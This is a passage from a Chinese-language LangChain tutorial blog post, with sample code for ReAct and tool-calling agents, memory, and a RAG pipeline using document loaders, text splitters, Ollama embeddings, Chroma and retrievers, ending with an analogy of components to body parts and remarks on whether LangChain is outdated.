适用场景：1、需要结构化输出的聊天应用 2、复杂参数的工具调用场景 3、多轮对话中的工具使用 4、需要格式化响应的业务场景
"""</span>
AgentType.STRUCTURED_CHAT_ZERO_SHOT_REACT_DESCRIPTION
<span class="hljs-string">"""
对话式ReAct Agent
特点：1、具备对话记忆能力，能记住历史交互 2、基于ReAct模式进行推理和行动 3、支持上下文相关的工具调用 4、适合长期对话和任务跟踪
适用场景：1、需要维护对话状态的应用 2、长期任务跟踪和管理 3、个性化服务和推荐 4、客户服务和技术支持场景
"""</span>
AgentType.CONVERSATIONAL_REACT_DESCRIPTION
</code></pre>
<p>7.3 ReAct Agent 结合大模型使用</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 创建Tavily搜索工具实例，用于为Agent提供实时网络搜索能力</span>
<span class="hljs-comment"># 需要在https://tavily.com/ 申请API key 才能使用</span>
<span class="hljs-attr">search_tool</span> = TavilySearchResults(
<span class="hljs-attr">max_results</span>=<span class="hljs-number">3</span>,
<span class="hljs-attr">description</span>=<span class="hljs-string">"用于搜索最新网页信息、新闻和历史数据。输入应该是明确的搜索查询。"</span>
)
<span class="hljs-comment"># 从LangChain Hub拉取预定义的ReAct提示词模板</span>
<span class="hljs-attr">prompt</span> = hub.pull(<span class="hljs-string">"hwchase17/react"</span>)
<span class="hljs-comment"># 创建ReAct Agent实例</span>
<span class="hljs-attr">agent</span> = create_react_agent(
<span class="hljs-attr">llm</span>=chat_model,
<span class="hljs-attr">prompt</span>=prompt,
<span class="hljs-attr">tools</span>=[search_tool]
)
<span class="hljs-comment"># 创建Agent执行器</span>
<span class="hljs-attr">agent_executor</span> = AgentExecutor(
<span class="hljs-attr">agent</span>=agent,
<span class="hljs-attr">handle_parsing_errors</span>=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># 自动处理解析错误，提高稳定性</span>
<span class="hljs-attr">verbose</span>=<span class="hljs-literal">True</span>,                <span class="hljs-comment"># 开启详细日志，显示推理过程</span>
<span class="hljs-attr">tools</span>=[search_tool]          <span class="hljs-comment"># 工具列表，必须与Agent中的工具保持一致</span>
)
<span class="hljs-comment"># 执行Agent任务</span>
<span class="hljs-attr">response</span> = agent_executor.invoke( {<span class="hljs-string">"input"</span>: <span class="hljs-string">"2021年2月5日腾讯收盘价是多少？"</span>})
print(response)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/140c16de0c7841daac2e2b6985c5cdbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=iIF8G7IWGBrRlpVR05mMsSVSB6w%3D" alt="" loading="lazy"/></p>
<p>7.4 FUNCTION_CALL 结合大模型、Memory 使用</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 创建Tavily搜索工具实例</span>
<span class="hljs-attr">search_tool</span> = TavilySearchResults(
<span class="hljs-attr">max_results</span>=<span class="hljs-number">3</span>, <span class="hljs-comment"># 限制搜索结果数量，平衡信息完整性和处理效率</span>
<span class="hljs-attr">description</span>=<span class="hljs-string">"用于搜索最新网页信息、新闻和历史数据。输入应该是明确的搜索查询。"</span>
)
<span class="hljs-comment"># 定义工具列表，可以添加多个</span>
<span class="hljs-attr">tools</span> = [search_tool]
<span class="hljs-comment"># 创建提示词模板</span>
<span class="hljs-attr">prompt</span> = ChatPromptTemplate.from_messages([
(<span class="hljs-string">"system"</span>, <span class="hljs-string">"你是一个人工智能小助手，可以回答问题并使用工具。"</span>),
(<span class="hljs-string">"placeholder"</span>, <span class="hljs-string">"{chat_history}"</span>),
(<span class="hljs-string">"human"</span>, <span class="hljs-string">"{input}"</span>),
(<span class="hljs-string">"placeholder"</span>, <span class="hljs-string">"{agent_scratchpad}"</span>)
])
<span class="hljs-comment"># 创建对话缓冲记忆实例</span>
<span class="hljs-attr">memory</span> = ConversationBufferMemory(
<span class="hljs-attr">memory_key</span>=<span class="hljs-string">"chat_history"</span>,
<span class="hljs-attr">return_messages</span>=<span class="hljs-literal">True</span>
)
<span class="hljs-comment"># 创建工具调用Agent实例</span>
<span class="hljs-attr">agent</span> = create_tool_calling_agent(chat_model, tools, prompt)
<span class="hljs-comment"># 创建Agent执行器</span>
<span class="hljs-attr">agent_executor</span> = AgentExecutor(
<span class="hljs-attr">agent</span>=agent,
<span class="hljs-attr">tools</span>=tools,
<span class="hljs-attr">memory</span>=memory,
<span class="hljs-attr">handle_parsing_errors</span>=<span class="hljs-literal">True</span>,
<span class="hljs-attr">verbose</span>=<span class="hljs-literal">True</span>
)
<span class="hljs-attr">response</span> = agent_executor.invoke({<span class="hljs-string">"input"</span>: <span class="hljs-string">"2021年2月5日腾讯收盘价是多少？"</span>})
print(response)
<span class="hljs-attr">response</span> = agent_executor.invoke({<span class="hljs-string">"input"</span>: <span class="hljs-string">"阿里呢？"</span>})
<span class="hljs-comment"># 嵌入Memory，可以推断出问的股价，</span>
print(response)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c83db9ea875460ba41a53a3e55c24aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=45w91alP13b85t8UL9zgeKugu2w%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">08</h2>
<p>LangChain核心组件之Retrieval</p>
<p>8.1 Retrieval（检索）概述</p>
<p>Retrieval是用于从大量的文档或数据源中查找相关信息的核心模块，它是构建RAG（检索增强生成）的基础，能够让大模型访问外部知识源，解决模型本身的知识局限性和时效性问题。</p>
<p>8.2 大模型幻觉</p>
<p>我们知道大模型有两个主要的特点：</p>
<ol>
<li>知识冻结：大模型在训练完成后，其内部知识就"冻结"在训练时的状态，并且无法获取或学习训练数据截止日期之后的新信息。</li>
<li>大模型幻觉：生成看似合理但实际错误、虚构或不存在的信息的现象（例如：9.11 &gt; 9.9）。</li>
</ol>
<p>虽然记忆机制扩展了AI工程的应用场景，但大模型在专业领域仍面临显著挑战，由于无法掌握全部专业知识，大模型在回答专业问题时可能生成不准确甚至完全错误的内容，这个现象被称为“幻觉”。尤其在金融、医疗等高要求领域，一次错误的金额评估或医疗诊断失误都是致命的，对于非专业人士来说可能难以辨识。当前还没彻底解决这个问题的方案，不过大家普遍达成共识的一个方案：</p>
<ol>
<li>为大模型提供一定的上下文信息，让其输出会变得更稳定。</li>
<li>利用RAG（检索增强生成）技术，将专业领域的知识检索出来和提示词一起发送给大模型，以便模型能生成更可靠的答案。</li>
</ol>
<p>8.3 RAG解决方案</p>
<p>在利用大模型处理特定领域的大规模知识问答时，除了微调模型之外，检索增强生成（RAG）是一个有效的缓解大模型幻觉问题的解决方案。RAG通过引入外部知识检索机制，在生成前为模型提供相关的实时、专有信息作为上下文，从而直接应对其固有的“幻觉”问题和知识更新瓶颈。</p>
<p>RAG流程：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01f23ec2508e4dc191615656d5e5985d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=iClERWFAG42PX1qf0xTjJJYUlmg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/040ee5cb71b74ad4a897e8486a3bb648~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=oidxd6Ba%2FfuPnZD7hP43UqS2GAU%3D" alt="" loading="lazy"/></p>
<p>1、文件解析：解析各种格式的文件并提取出文字。</p>
<p>2、文件切割：把长文本切割成更小的、有逻辑的片段。</p>
<p>3、向量化：将文字片段转换为高纬空间中的向量数字。</p>
<p>4、知识入库：将这些向量数字存进向量数据库中</p>
<p>5、用户提问：用户发起提问</p>
<p>6、检索：基于各种算法（余弦相似度、欧氏距离、点积等）去向量数据库里快速找出和问题最相关的几个文本片段。</p>
<p>7、知识重排序：对找出的片段进行梳理排序，找出相似度最高的。</p>
<p>8、增强：把选好的知识片段和用户的问题打包在一起交给大模型。</p>
<p>9、生成：大模型生成一个准确且相关的回答。</p>
<p>其中第678是RAG步骤中的检索、增强、生成。这里有三个位置涉及到大模型的使用：</p>
<p>第3步：向量化，需要使用EmbeddingModels。</p>
<p>第7步：重排序，需要使用RerankModels（追求回答高精度和高相关性的场景）。</p>
<p>第9步：生成答案，需要使用LLM。</p>
<p>RAG的优点</p>
<ol>
<li>知识实时更新：只需更新知识库，即可让模型获取最新信息，解决知识冻结问题</li>
<li>成本效益高：相比微调，仅需构建知识库，成本低，且避免了微调可能带来的“灾难性遗忘”问题</li>
<li>可信度高，可溯源：答案有据可查，可提供引用来源，有效减少模型“幻觉”。</li>
<li>安全可控：可限制模型只基于提供的知识回答，避免泄露敏感信息或产生有害内容。</li>
</ol>
<p>RAG的缺点</p>
<ol>
<li>检索质量是瓶颈：效果高度依赖于检索器的准确性。不相关的检索结果会直接导致回答错误。</li>
<li>系统复杂性高：需维护检索、向量数据库等多个组件，比直接调用API复杂得多。</li>
<li>上下文窗口受限：检索内容会消耗宝贵的上下文窗口，可能挤占大模型的推理空间。</li>
<li>对知识库质量极度敏感：如果外部知识库本身质量差（内容错误、格式混乱、信息过时），那么RAG系统的输出质量也必然无法保证。</li>
</ol>
<p>8.4 Retrieval流程</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7b2439869f148369ba604f05ed94bb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=B7F04zRlBsarpYK6y9CbyPlqH8w%3D" alt="" loading="lazy"/></p>
<p>阶段一：Source（数据源），外部知识库，包含各种类型、格式的文件，如图片、视频、网站等</p>
<p>阶段二：Load（加载），将外部知识库加载到内存中并转换成文档(Document)对象。包含内容和元数据等相关信息。</p>
<p>阶段三：Transform（转换），将文档对象转换为更适合检索和生成的表达形式。包括文本分块、清理冗余信息、关键信息提取等，旨在提升后续处理的效率与质量</p>
<p>阶段四：Embed（嵌入），通过嵌入模型将文本转换为高纬度空间中的数值向量，使得计算机能够理解和处理语义信息，文本可用于向量空间中的各种运算，大大拓展了文本分析的可能性，是自然语言处理领域非常重要的技术。</p>
<ul>
<li>实现原理：通过特定算法 （如Word2Vec）将语义信息编码为固定维度的向量。</li>
<li>关键特性：相似的词在向量空间中距离相近，例如“猫”和“狗”的向量夹角小于“猫”和“汽车”。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ebfa01e813e4fb58d5004b4939b99d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=hqPQN%2B8L%2BLP6Sg3Y9NOy3YNDefs%3D" alt="" loading="lazy"/></p>
<p>文本嵌入为 LangChain 中的问答、检索、推荐等功能提供了重要支持。具体为：</p>
<ol>
<li>语义匹配：通过计算两个文本的向量余弦相似度，判断它们在语义上的相似程度，实现语义匹配。</li>
<li>文本检索：通过计算不同文本之间的向量相似度，可以实现语义搜索，找到向量空间中最相似的文本。</li>
<li>信息推荐：根据用户的历史记录或兴趣嵌入生成用户向量，计算不同信息的向量与用户向量的相似度，推荐相似的信息。</li>
<li>知识挖掘：可以通过聚类、降维等手段分析文本向量的分布，发现文本之间的潜在关联，挖掘知识。</li>
<li>自然语言处理：将词语、句子等表示为稠密向量，为神经网络等下游任务提供输入。</li>
</ol>
<p>阶段五：Store（存储），将转换后的向量存储在向量数据库中，避免需要时重新计算。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a133a7e3ba0b4749b22a8e587cd17d32~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=mIhfkACNIutHAyVNd%2FWf7PESt0Q%3D" alt="" loading="lazy"/></p>
<p>8.5 Retrieval组件使用</p>
<p>1、Document Loaders（文档加载器）</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 加载txt文件</span>
<span class="hljs-attr">text_loader</span> = TextLoader(<span class="hljs-string">"./risk.txt"</span>)
<span class="hljs-attr">docs</span> = text_loader.load()
<span class="hljs-comment"># print(docs)</span>
<span class="hljs-comment"># 加载pdf文件</span>
<span class="hljs-attr">pdf_loader</span> = PyPDFLoader(file_path=<span class="hljs-string">"./risk.pdf"</span>)
<span class="hljs-attr">docs</span> = pdf_loader.load()
print(docs)
<span class="hljs-comment"># 加载csv文件</span>
<span class="hljs-attr">csv_loader</span> = CSVLoader(file_path=<span class="hljs-string">"./risk.csv"</span>)
<span class="hljs-attr">docs</span> = csv_loader.load()
print(docs)
<span class="hljs-comment">#加载json文件</span>
<span class="hljs-attr">json_loader</span> = JSONLoader(file_path=<span class="hljs-string">"./risk.json"</span>)
<span class="hljs-attr">docs</span> = json_loader.load()
print(docs)
</code></pre>
<p>Documment对象中有两个重要的属性：</p>
<ol>
<li>page_content：真正的文档内容</li>
<li>metadata：文档内容的元数据</li>
</ol>
<p>2、Text Splitters（文本拆分器）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa169140f4fe4c578e2564459225832c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=rGo578S50ivH%2BOuITlCl7y%2Bj%2Fbk%3D" alt="" loading="lazy"/></p>
<p>文本拆分器是将长文档拆分为语义连贯、大小适中的小片段，主要是解决大模型的上下文窗口限制，并提升检索的准确性和生成内容的质量。它的工作原理通常遵循“先细拆后合并”的策略：首先将文本分割成小句子，然后按顺序将这些小句子合并成较大的块，直到达到设定的块大小限制。在创建新块时，会与上一个块保留部分重叠，以确保上下文连贯。</p>
<p>为什么需要分隔？</p>
<ol>
<li>保证生成答案质量：如果检索到的文本块过大且包含大量无关信息，LLM 可能会被无关内容干扰，无法聚焦于核心问题，甚至可能将无关信息错误地整合进答案，导致生成内容不准确或冗长。</li>
<li>突破模型上下文窗口限制：所有大模型都有一个固定的上下文窗口，即模型能一次性“看到”并处理的文本总量是有限的。</li>
<li>提升检索的精准度：检索系统可以直接定位到专门回答该问题的段落，极大地提升了检索结果的相关性和准确性。</li>
</ol>
<p>基于此，一个有效的解决方案就是将完整的Document对象进行分块处理（Chunking) 。无论是在存储还是检索过程中，都将以这些块(chunks) 为基本单位，这样有效地避免内容不相关性问题和超出最大输入限制的问题。</p>
<p>Chunking拆分的策略：</p>
<ol>
<li>固定长度切分：严格按照预设的固定字符数或 Token 数进行切分，是最简单直接的方法。</li>
<li>递归切分：采用分层分隔符策略，优先使用大粒度分隔符切分，若不满足大小要求，则逐级使用更小粒度的分隔符递归切分，直到达到目标块大小。默认分隔符顺序为 ["\n\n", "\n", "。", "，", " ", ""]，它会优先按段落、句子、标点进行切分，能有效保留句子和段落的完整性</li>
<li>基于文档结构的切分：利用文档固有的格式和结构进行切分，如 Markdown 的标题、HTML 的标签、代码文件的函数/类定义等。</li>
<li>语义分块：它利用嵌入模型计算句子或段落的向量表示，然后通过分析向量间的相似度来动态确定切分点，将语义相近的内容聚合到同一个块中，旨在保持相关信息的集中和完整。</li>
</ol>

<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">text_loader</span> = TextLoader(<span class="hljs-string">"./risk.txt"</span>)
<span class="hljs-attr">docs</span> = text_loader.load()
<span class="hljs-attr">text_splitter</span> = CharacterTextSplitter(
<span class="hljs-comment"># 文本块大小：每个分割块的最大字符数，1000字符通常包含150-200个中文词汇，适合大多数LLM的上下文窗口处理</span>
<span class="hljs-attr">chunk_size</span>=<span class="hljs-number">1000</span>,
<span class="hljs-comment"># 文本块重叠：相邻块之间的重叠字符数，设置为0表示无重叠，节省存储空间，通常设置为chunk_size的10-20%以保持上下文连续性</span>
<span class="hljs-attr">chunk_overlap</span>=<span class="hljs-number">0</span>,
<span class="hljs-comment"># 长度计算函数：用于计算文本长度的函数，len()函数按字符计数，适合中英文混合文本，也可以使用token计数函数获得更精确的控制</span>
<span class="hljs-attr">length_function</span>=len,
<span class="hljs-comment"># 分割符：优先按换行符分割文本，保持段落结构的完整性，避免句子被截断</span>
<span class="hljs-attr">separator</span>=<span class="hljs-string">"\n"</span>
)
<span class="hljs-attr">texts</span> = text_splitter.split_text(docs[<span class="hljs-number">0</span>].page_content)
print(texts)
</code></pre>
<p>除了CharacterTextSplitter，LangChain还提供了很多拆分器，如：RecursiveCharacterTextSplitter、TokenTextSplitter、CharacterTextSplitter、SemanticChunker、HTMLHeaderTextSplitter等。具体使用可参考官方文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpython.langchain.com.cn%2Fdocs%2Fmodules%2Fdata" target="_blank" title="https://python.langchain.com.cn/docs/modules/data" ref="nofollow noopener noreferrer">python.langchain.com.cn/docs/module…</a>_connection/document_transformers/</p>
<p>3、Text Embedding Models（文档嵌入模型）</p>
<p>将文本转换为数值向量</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7f5a9f5048c4234b127d06532633a97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=ytbwPguDHWd2WL0k0REP6c185lc%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">embeddings_model</span> = OllamaEmbeddings(
<span class="hljs-attr">model</span>=<span class="hljs-string">"nomic-embed-text"</span>,
<span class="hljs-attr">base_url</span>=<span class="hljs-string">"http://127.0.0.1:11434"</span>,
)
<span class="hljs-attr">text</span> = <span class="hljs-string">"Hello World"</span>
<span class="hljs-comment"># 句子向量化</span>
<span class="hljs-attr">vector</span> = embeddings_model.embed_query(text=text)
print(f"嵌入向量长度: {len(vector)}")
print(f"前20个值: {vector<span class="hljs-section">[:20]</span>}<span class="hljs-attr">")
print("</span>=======================================<span class="hljs-string">")
texts = ["</span>Hello World<span class="hljs-string">", "</span>Today is a sunny day<span class="hljs-string">", "</span><span class="hljs-literal">No</span> news is good news<span class="hljs-string">"]
# 文档向量化
vector = embeddings_model.embed_documents(texts)
for v in vector:
print(f"</span>前<span class="hljs-number">20</span>个值: {v[:<span class="hljs-number">20</span>]}<span class="hljs-string">")
</span></code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bcf0de2dd004e7e9264e7591d2ba7a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=AAUaA93uoNIyH5rXvrFU5PRkhto%3D" alt="" loading="lazy"/></p>
<p>4、Vector Stores（向量存储）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bd78101ac2549df827745529d868331~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=vLVu8A77DJeIqCsPMw6Smn1SXmk%3D" alt="" loading="lazy"/></p>
<p>将文本向量化之后，下一步就是进行向量的存储。这里有两部分：</p>
<ol>
<li>向量的存储 ：将非结构化数据向量化后，存储在向量数据库。</li>
<li>向量的查询 ：查询时，嵌入非结构化查询并检索与嵌入查询“最相似”的嵌入向量。即具有相似性检索能力。</li>
</ol>
<p>LangChain提供了50多种不同的向量数据库，参考文档：向量存储</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2Foss%2Fpython%2Flangchain%2Foverview" target="_blank" title="https://docs.langchain.com/oss/python/langchain/overview" ref="nofollow noopener noreferrer">docs.langchain.com/oss/python/…</a></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 加载txt文件</span>
<span class="hljs-attr">text_loader</span> = TextLoader(<span class="hljs-string">"./risk.txt"</span>, encoding=<span class="hljs-string">"utf-8"</span>)
<span class="hljs-attr">docs</span> = text_loader.load()
<span class="hljs-comment"># 文本分割</span>
<span class="hljs-attr">text_splitter</span> = CharacterTextSplitter(chunk_size=<span class="hljs-number">1000</span>, chunk_overlap=<span class="hljs-number">0</span>)
<span class="hljs-attr">text_docs</span> = text_splitter.split_documents(docs)
<span class="hljs-comment"># 向量存储，默认存储在内存中， 可通过persistent_directory参数指定存储磁盘路径</span>
<span class="hljs-attr">vectorstore</span> = Chroma.from_documents(text_docs, embeddings_model, persistent_directory=<span class="hljs-string">'./chroma_db'</span>)
<span class="hljs-comment"># 相似度搜索，除了similarity_search外，</span>
<span class="hljs-comment"># 1、直接对问题向量查询（similarity_search_by_vector）</span>
<span class="hljs-comment"># 2、通过L2距离分数进行搜索（similarity_search_with_score）</span>
<span class="hljs-comment"># 3、通过余弦相似度分数进行搜索（similarity_search_with_relevance_scores）</span>
<span class="hljs-comment"># 4、MMR（最大边际相关性，max_marginal_relevance_search）</span>
<span class="hljs-attr">response</span> = vectorstore.similarity_search(<span class="hljs-string">"什么是反洗钱？"</span>)
print(response)
</code></pre>
<p>5、Retrievers（检索器）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40ad0a7c5081448c8dc5bad622141e26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=6ZBQSxEOQ0AhnGs3B0uctD2vQSw%3D" alt="" loading="lazy"/></p>
<p>向量数据库提供了核心的相似性计算能力，其内置函数（如余弦相似度，欧式距离，点积等）可直接用于实现基础的向量召回。LangChain还提供了 更加复杂的召回策略 ，这些策略被集成在Retrievers（检索器）组件中。检索器本身不存储数据，而是通过查询向量数据库，并集成重排序、多路检索等高级逻辑，最终返回相关的文档片段。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># # 加载txt文件</span>
<span class="hljs-attr">text_loader</span> = TextLoader(<span class="hljs-string">"./risk.txt"</span>, encoding=<span class="hljs-string">"utf-8"</span>)
<span class="hljs-attr">docs</span> = text_loader.load()
<span class="hljs-attr">text_splitter</span> = CharacterTextSplitter(chunk_size=<span class="hljs-number">1000</span>, chunk_overlap=<span class="hljs-number">0</span>)
<span class="hljs-attr">text_docs</span> = text_splitter.split_documents(docs)
<span class="hljs-comment"># 向量存储，默认存储在内存中， 可通过persistent_directory参数指定存储磁盘路径</span>
<span class="hljs-attr">vectorstore</span> = Chroma.from_documents(docs, embeddings_model, persistent_directory=<span class="hljs-string">'./chroma_db'</span>)
<span class="hljs-comment"># 创建检索器</span>
<span class="hljs-attr">retriever</span> = vectorstore.as_retriever(
<span class="hljs-comment"># 搜索参数，k表示返回的文档数量，score_threshold表示相似度阈值</span>
<span class="hljs-attr">search_kwargs</span>={<span class="hljs-string">"k"</span>: <span class="hljs-number">2</span>, <span class="hljs-string">"score_threshold"</span>: <span class="hljs-number">0.5</span>},
<span class="hljs-comment"># 搜索类型</span>
<span class="hljs-attr">search_type</span>=<span class="hljs-string">"similarity_score_threshold"</span>
)
<span class="hljs-attr">chain</span> = retriever | chat_model
<span class="hljs-attr">response</span> = chain.invoke(<span class="hljs-string">"什么是反洗钱？"</span>)
print(response)
</code></pre>
<h2 data-id="heading-8">09</h2>
<p>再谈LangChain</p>
<p>读到这想必你对LangChain有一个清晰的认识了，为了更形象地理解，如果将LLM比作人类的”大脑“，那么LangChain中的组件就像：</p>
<ol>
<li>LLM（大语言模型） ——  大脑</li>
</ol>
<p>整个系统的核心，负责思考、推理、理解和生成。就像人类的大脑，是智能的中枢。它接收来自各方的信息，进行处理，并做出决策或生成回应。</p>
<ol start="2">
<li>RAG &amp; VectorStore（检索增强生成与向量数据库） ——  图书馆/长期记忆</li>
</ol>
<p>存储海量的专业知识（公司文档、知识库等），并能在需要时快速、准确地检索相关信息提供给“大脑”。它是一个巨大的私人图书馆或长期记忆仓库，当你需要解决一个专业问题时，你会来图书馆查阅相关资料，然后将这些资料带给大脑（LLM）进行参考和分析。</p>
<ol start="3">
<li>Agents（智能体） ——  神经系统/小脑</li>
</ol>
<p>负责决策“如何”完成任务。它接收用户指令，进行规划，决定是直接由大脑（LLM）回答，还是需要调用各种工具（Tools），并按照什么顺序来执行。就像人体的神经系统或小脑。大脑（LLM）负责出主意，而Agent负责协调身体各部分去执行这个主意。例如，你想“拿一杯水”，大脑发出指令，神经系统（Agent）会规划并协调眼睛（观察）、手（抓取）等一系列动作。</p>
<ol start="4">
<li>Tools（工具） ——  手、脚和感官</li>
</ol>
<p>是Agent可以调用的具体功能，用于与外部世界交互。就像人的手、脚、眼睛和耳朵。</p>
<ol start="5">
<li>Chains（链） ——  技能或肌肉记忆</li>
</ol>
<p>将多个步骤（LLM调用、工具使用、数据处理）预先定义并链接在一起，形成一个可重复执行的固定流程。像是你学会的一种“技能”或“肌肉记忆”。例如，“泡咖啡”这个技能就是一个链：走到咖啡机前 -&gt; 加咖啡粉 -&gt; 按开关 -&gt; 等待 -&gt; 拿杯子。一旦学会，你就可以不假思索地完成。</p>
<ol start="6">
<li>Memory（记忆） ——  短期记忆/对话记忆</li>
</ol>
<p>用于存储和回顾当前对话的历史信息，使AI能够拥有上下文感知能力，实现连贯的多轮对话。就像你的短期记忆。它让你记得在刚才的对话中对方说了什么，从而能做出相关的回应。没有记忆，每一次对话都是全新的、孤立的。</p>
<ol start="7">
<li>PromptTemplates（提示模板） ——  沟通技巧/提问模板</li>
</ol>
<p>预先设计好的、结构化的提示词，用于更有效、更稳定地向LLM提问。就像沟通技能、演讲技能，写作技能，都有一套固定的模版。</p>
<p>通过这个比喻，我们可以清晰地看到：LLM是智能的核心（脑）、RAG是知识储备（图书馆）、Agents是协调指挥官（神经系统）、Tools是执行手段（手脚）、Chains是自动化技能（肌肉记忆）、Memory是上下文感知（短期记忆），它们各司其职，紧密协作，共同构成了一个能够理解、推理并作用于外部世界的智能体。</p>
<p>至此，关于LangChain的组件使用就介绍完了，上述内容仅仅只是对LangChain使用的简单介绍以及一些大模型应用开发相关的概念，如果需要更深入的理解LangChain，可以参考官方文档。作为一个初学者，上述内容如果有理解不准确或错误的地方，欢迎指正。如果文章对你有一点点帮助，辛苦点个赞吧🫡</p>
<h2 data-id="heading-9">写在最后</h2>
<p>当前，网上对于LangChain是否已经过时有很大的争议，主要有两方面原因：1、随着GPT-4、Claude 3等大模型原生支持函数调用、工具链集成，LangChain早期作为“模型与工具粘合剂”的核心优势被持续削弱。2、大量开发人员反馈其框架存在一定冗余性，对轻量化需求（如简单的文档问答、单工具调用）而言，用LangChain反而不如自研脚本或LlamaIndex等轻量工具高效。</p>
<p>但是，作为一个初学者，我认为LangChain仍是现阶段入门大模型应用开发的优质选择。它最大的价值，并不是“不可替代的工具”，而是它将大模型开发的核心环节（Prompt工程、记忆、向量存储、多模态交互、Agent逻辑设计等）拆解为标准化模块，让新手能直观的理解一个完整AI应用的底层逻辑。这种 “先掌握框架思维，再选择工具” 的学习路径，反而更具有长远的价值，即便后续根据业务场景转向轻量工具或自研方案，通过LangChain建立的“大模型应用开发认知体系”，也能成为快速上手其他工具的基础。</p>
<p>LangChain相关资料地址如下：</p>
<p>LangChain 官网地址： <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.langchain.com%2Flangchain" target="_blank" title="https://www.langchain.com/langchain" ref="nofollow noopener noreferrer">www.langchain.com/langchain</a></p>
<p>LangChain 官网文档： <a href="https://link.juejin.cn?target=https%3A%2F%2Fpython.langchain.com%2Fdocs%2Fintroduction%2F" target="_blank" title="https://python.langchain.com/docs/introduction/" ref="nofollow noopener noreferrer">python.langchain.com/docs/introd…</a></p>
<p>LangChan API文档： <a href="https://link.juejin.cn?target=https%3A%2F%2Fpython.langchain.com%2Fapi" target="_blank" title="https://python.langchain.com/api" ref="nofollow noopener noreferrer">python.langchain.com/api</a>_reference/</p>
<p>LangChain github地址： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flangchain-ai%2Flangchain" target="_blank" title="https://github.com/langchain-ai/langchain" ref="nofollow noopener noreferrer">github.com/langchain-a…</a></p>
<p>LangChain中文网： <a href="https://link.juejin.cn?target=https%3A%2F%2Fpython.langchain.com.cn%2Fdocs%2F" target="_blank" title="https://python.langchain.com.cn/docs/" ref="nofollow noopener noreferrer">python.langchain.com.cn/docs/</a></p>
